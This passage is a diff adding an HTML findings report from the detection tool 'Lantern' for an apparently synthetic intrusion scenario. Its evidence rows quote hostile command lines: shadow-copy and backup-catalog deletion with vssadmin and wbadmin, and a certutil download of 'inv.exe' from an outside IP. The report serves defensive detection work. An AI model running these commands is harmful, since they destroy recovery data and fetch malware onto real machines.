+      <tbody><tr><td class="nowrap mono">2026-03-14 02:41:15</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_sql<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:723</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:24</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_iis<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:724</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:30</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_backup<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:725</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:37</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_sharepoint<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:726</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:44</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_scan<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:727</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:49</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_reporting<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:728</td></tr><tr><td class="nowrap mono">2026-03-14 02:41:57</td><td>4769</td><td class="nowrap">DC01</td><td class="kv"><span>TargetUserName=</span>j.alvarez@CORP.LOCAL<br><span>ServiceName=</span>svc_crm<br><span>IpAddress=</span>::ffff:10.0.20.57<br><span>TicketEncryptionType=</span>0x17</td><td class="nowrap mono">attack_scenario.jsonl:729</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f14" data-sev="critical" data-hosts="FS01">
+  <summary>
+    <span class="when">2026-03-14 02:58:40</span>
+    <span class="sev critical">Critical</span>
+    <span class="title">Shadow copies or backups deleted<small>SubjectUserName=j.alvarez, CommandLine=cmd.exe /c vssadmin.exe delete shadows /all /quiet</small></span>
+    <span class="where">FS01</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A command deleted volume shadow copies or the backup catalog, or turned off Windows recovery. Ransomware does this right before encrypting so victims cannot restore files. Treat it as an active incident.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-014 (match)</dd><dt>When</dt><dd>2026-03-14 02:58:40 UTC</dd><dt>Hosts</dt><dd>FS01.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noopener">T1490 Inhibit System Recovery</a></dd><dt>Tactics</dt><dd>Impact</dd><dt>Could also be</dt><dd>Storage administrators pruning old shadow copies by hand</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:58:40</td><td>4688</td><td class="nowrap">FS01</td><td class="kv"><span>SubjectUserName=</span>j.alvarez<br><span>CommandLine=</span>cmd.exe /c vssadmin.exe delete shadows /all /quiet<br><span>NewProcessName=</span>C:\Windows\System32\cmd.exe</td><td class="nowrap mono">attack_scenario.jsonl:746</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f15" data-sev="critical" data-hosts="FS01">
+  <summary>
+    <span class="when">2026-03-14 02:58:41</span>
+    <span class="sev critical">Critical</span>
+    <span class="title">Shadow copies or backups deleted<small>SubjectUserName=j.alvarez, CommandLine=vssadmin.exe  delete shadows /all /quiet</small></span>
+    <span class="where">FS01</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A command deleted volume shadow copies or the backup catalog, or turned off Windows recovery. Ransomware does this right before encrypting so victims cannot restore files. Treat it as an active incident.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-014 (match)</dd><dt>When</dt><dd>2026-03-14 02:58:41 UTC</dd><dt>Hosts</dt><dd>FS01.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noopener">T1490 Inhibit System Recovery</a></dd><dt>Tactics</dt><dd>Impact</dd><dt>Could also be</dt><dd>Storage administrators pruning old shadow copies by hand</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:58:41</td><td>4688</td><td class="nowrap">FS01</td><td class="kv"><span>SubjectUserName=</span>j.alvarez<br><span>CommandLine=</span>vssadmin.exe  delete shadows /all /quiet<br><span>NewProcessName=</span>C:\Windows\System32\vssadmin.exe</td><td class="nowrap mono">attack_scenario.jsonl:747</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f16" data-sev="critical" data-hosts="FS01">
+  <summary>
+    <span class="when">2026-03-14 02:59:04</span>
+    <span class="sev critical">Critical</span>
+    <span class="title">Shadow copies or backups deleted<small>SubjectUserName=j.alvarez, CommandLine=wbadmin.exe delete catalog -quiet</small></span>
+    <span class="where">FS01</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A command deleted volume shadow copies or the backup catalog, or turned off Windows recovery. Ransomware does this right before encrypting so victims cannot restore files. Treat it as an active incident.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-014 (match)</dd><dt>When</dt><dd>2026-03-14 02:59:04 UTC</dd><dt>Hosts</dt><dd>FS01.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noopener">T1490 Inhibit System Recovery</a></dd><dt>Tactics</dt><dd>Impact</dd><dt>Could also be</dt><dd>Storage administrators pruning old shadow copies by hand</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:59:04</td><td>4688</td><td class="nowrap">FS01</td><td class="kv"><span>SubjectUserName=</span>j.alvarez<br><span>CommandLine=</span>wbadmin.exe delete catalog -quiet<br><span>NewProcessName=</span>C:\Windows\System32\wbadmin.exe</td><td class="nowrap mono">attack_scenario.jsonl:748</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f17" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 03:04:51</span>
+    <span class="sev high">High</span>
+    <span class="title">Windows event log cleared<small>SubjectUserName=j.alvarez, SubjectDomainName=CORP</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">The Security log was cleared (event 1102), or another log was cleared (System event 104). Attackers clear logs to remove evidence of what they did. Legitimate clears are rare and are usually tied to a change ticket.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-001 (match)</dd><dt>When</dt><dd>2026-03-14 03:04:51 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1070/001/" target="_blank" rel="noopener">T1070.001 Indicator Removal: Clear Windows Event Logs</a></dd><dt>Tactics</dt><dd>Defense Evasion</dd><dt>Could also be</dt><dd>Administrators clearing logs during a planned rebuild</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 03:04:51</td><td>1102</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>SubjectUserName=</span>j.alvarez<br><span>SubjectDomainName=</span>CORP</td><td class="nowrap mono">attack_scenario.jsonl:754</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f18" data-sev="high" data-hosts="WS-HR-03">
+  <summary>
+    <span class="when">2026-03-14 09:14:53</span>
+    <span class="sev high">High</span>
+    <span class="title">Office application started a shell or script host<small>User=CORP\a.haddad, ParentImage=C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE, Image=C:\Windows\System32\cmd.exe, CommandLine=cmd.exe /c certutil.exe -urlcache -split -f http://198.51.100.23/inv.exe C:\Users\Publi...</small></span>
+    <span class="where">WS-HR-03</span>
+  </summary>
+  <div class="body">
+    <p class="desc">Word, Excel, PowerPoint, Outlook, OneNote or Access started a shell, script host or LOLBin. This is the classic sign of a malicious macro or attachment running code.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-013 (match)</dd><dt>When</dt><dd>2026-03-14 09:14:53 UTC</dd><dt>Hosts</dt><dd>WS-HR-03.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1566/001/" target="_blank" rel="noopener">T1566.001 Phishing: Spearphishing Attachment</a>, <a href="https://attack.mitre.org/techniques/T1204/002/" target="_blank" rel="noopener">T1204.002 User Execution: Malicious File</a></dd><dt>Tactics</dt><dd>Initial Access, Execution</dd><dt>Could also be</dt><dd>Add-ins that shell out for legitimate reasons; baseline by command line</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 09:14:53</td><td>1</td><td class="nowrap">WS-HR-03</td><td class="kv"><span>User=</span>CORP\a.haddad<br><span>ParentImage=</span>C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE<br><span>Image=</span>C:\Windows\System32\cmd.exe<br><span>CommandLine=</span>cmd.exe /c certutil.exe -urlcache -split -f http://198.51.100.23/inv.exe C:\Users\Public\inv.exe</td><td class="nowrap mono">attack_scenario.jsonl:1378</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f19" data-sev="high" data-hosts="WS-HR-03">
+  <summary>
+    <span class="when">2026-03-14 09:14:54</span>
+    <span class="sev high">High</span>
+    <span class="title">Certutil used to download a file<small>User=CORP\a.haddad, ParentImage=C:\Windows\System32\cmd.exe, CommandLine=certutil.exe -urlcache -split -f http://198.51.100.23/inv.exe C:\Users\Public\inv.exe</small></span>
+    <span class="where">WS-HR-03</span>
+  </summary>
+  <div class="body">
+    <p class="desc">certutil.exe, a built-in certificate tool, was run with -urlcache or -verifyctl, which can fetch files from a URL. Attackers use it to download payloads with a signed Microsoft binary.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-016 (match)</dd><dt>When</dt><dd>2026-03-14 09:14:54 UTC</dd><dt>Hosts</dt><dd>WS-HR-03.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener">T1105 Ingress Tool Transfer</a></dd><dt>Tactics</dt><dd>Command and Control</dd><dt>Could also be</dt><dd>Rare; some admins clear the URL cache with -urlcache * delete</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 09:14:54</td><td>1</td><td class="nowrap">WS-HR-03</td><td class="kv"><span>User=</span>CORP\a.haddad<br><span>ParentImage=</span>C:\Windows\System32\cmd.exe<br><span>CommandLine=</span>certutil.exe -urlcache -split -f http://198.51.100.23/inv.exe C:\Users\Public\inv.exe<br><span>Image=</span>C:\Windows\System32\certutil.exe</td><td class="nowrap mono">attack_scenario.jsonl:1379</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details></div>
+
+  <h2>By host</h2><div class="hosts"><section class="host"><h3>DC01.corp.local</h3><ol><li class="high"><span class="when">02:41:15</span><a href="#f13">Possible Kerberoasting (many RC4 service tickets)</a></li></ol></section><section class="host"><h3>FS01.corp.local</h3><ol><li class="critical"><span class="when">02:58:40</span><a href="#f14">Shadow copies or backups deleted</a></li><li class="critical"><span class="when">02:58:41</span><a href="#f15">Shadow copies or backups deleted</a></li><li class="critical"><span class="when">02:59:04</span><a href="#f16">Shadow copies or backups deleted</a></li></ol></section><section class="host"><h3>WS-FIN-07.corp.local</h3><ol><li class="critical"><span class="when">02:10:04</span><a href="#f1">Successful logon after repeated failures</a></li><li class="high"><span class="when">02:10:04</span><a href="#f2">Password spraying from a single source</a></li><li class="medium"><span class="when">02:10:22</span><a href="#f3">Repeated failed logons for one account</a></li><li class="high"><span class="when">02:20:54</span><a href="#f4">RDP logon from a public IP address</a></li><li class="high"><span class="when">02:26:11</span><a href="#f5">PowerShell started with an encoded command</a></li><li class="high"><span class="when">02:26:13</span><a href="#f6">Suspicious PowerShell script block</a></li><li class="high"><span class="when">02:26:20</span><a href="#f7">Suspicious PowerShell script block</a></li><li class="critical"><span class="when">02:29:37</span><a href="#f8">Process opened LSASS memory</a></li><li class="medium"><span class="when">02:33:02</span><a href="#f9">Local user account created</a></li><li class="high"><span class="when">02:33:13</span><a href="#f10">Member added to a privileged group</a></li><li class="high"><span class="when">02:35:06</span><a href="#f11">Service installed from a suspicious path</a></li><li class="high"><span class="when">02:36:32</span><a href="#f12">Suspicious scheduled task created</a></li><li class="high"><span class="when">03:04:51</span><a href="#f17">Windows event log cleared</a></li></ol></section><section class="host"><h3>WS-HR-03.corp.local</h3><ol><li class="high"><span class="when">09:14:53</span><a href="#f18">Office application started a shell or script host</a></li><li class="high"><span class="when">09:14:54</span><a href="#f19">Certutil used to download a file</a></li></ol></section></div>
+  
+
+  <footer>Generated by Lantern 0.1.0. Findings are leads for investigation, not verdicts.</footer>
+</main>
+<script>
+(() => {
+  const rows = [...document.querySelectorAll('details.finding')];
+  const buttons = [...document.querySelectorAll('[data-sev]')];
+  const host = document.getElementById('host-filter');
+  const shown = document.getElementById('shown');
+  const active = new Set(buttons.map(b => b.dataset.sev));
+  function apply() {
+    let n = 0;
+    for (const row of rows) {
+      const ok = active.has(row.dataset.sev) && (!host.value || row.dataset.hosts.split(' ').includes(host.value));
+      row.hidden = !ok; if (ok) n++;
+    }
+    shown.textContent = n === rows.length ? `Showing all ${n}` : `Showing ${n} of ${rows.length}`;
+  }
+  for (const b of buttons) b.addEventListener('click', () => {
+    const on = b.getAttribute('aria-pressed') === 'true';
+    b.setAttribute('aria-pressed', String(!on));
+    on ? active.delete(b.dataset.sev) : active.add(b.dataset.sev);
+    apply();
+  });
+  host.addEventListener('change', apply);
+  document.getElementById('expand').addEventListener('click', e => {
+    const open = e.target.dataset.open !== 'true';
+    rows.forEach(r => { if (!r.hidden) r.open = open; });
+    e.target.dataset.open = String(open);
+    e.target.textContent = open ? 'Collapse all' : 'Expand all';
+  });
+  apply();
+})();
+</script>
+</body>
+</html>
